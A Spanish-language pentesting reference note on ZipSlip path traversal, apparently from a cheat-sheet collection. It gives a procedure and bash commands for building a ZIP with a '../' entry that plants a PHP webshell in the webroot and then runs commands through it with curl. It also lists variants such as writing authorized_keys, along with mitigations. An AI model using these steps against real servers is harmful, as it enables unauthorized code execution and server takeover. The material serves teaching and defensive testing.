---
topic: "ZipSlip: traversal al descomprimir archivos"
tags: [web, zipslip, upload, path-traversal]
---

# ZipSlip: traversal al descomprimir archivos

[🌐 English](zipslip.en.md) | **Español**

## Concepto

Si una aplicación descomprime un ZIP sin validar las rutas internas, una entrada con `../` puede escribir fuera del directorio destino. Esto permite sobrescribir archivos del servidor o colocar un webshell.

## Cuándo aplica

- La aplicación acepta y descomprime ZIPs.
- El nombre interno no se normaliza.
- El proceso puede escribir en el webroot.

## Procedimiento

1. Crear un archivo con una ruta `../../..` dentro del ZIP.
2. Subir el ZIP.
3. Comprobar la ruta de escritura.
4. Invocar el archivo desde la web.

```bash
cp shell.php ../../../../var/www/html/shell.php
zip malicious.zip ../../../../var/www/html/shell.php
unzip -l malicious.zip
# subir malicious.zip
curl 'http://<IP>/shell.php?cmd=id'
```

## Variantes

- Sobrescribir una vista o un archivo de configuración.
- Escribir en `authorized_keys` si el proceso es root.
- Usar nombres absolutos si el ZIP lo permite.

## Limitaciones

- La extracción debe conservar las rutas.
- El proceso debe poder escribir el destino.
- El archivo debe ser interpretado por el servidor.

## Mitigación y detección

- Normalizar y confinar las rutas extraídas.
- Usar un directorio aislado y permisos mínimos.
- Rechazar entradas absolutas o con `..`.

## Referencias

- <https://security.snyk.io/research/zip-slip-vulnerability>
- <https://owasp.org/www-community/attacks/Path_Traversal>
- <https://attack.mitre.org/techniques/T1105/>
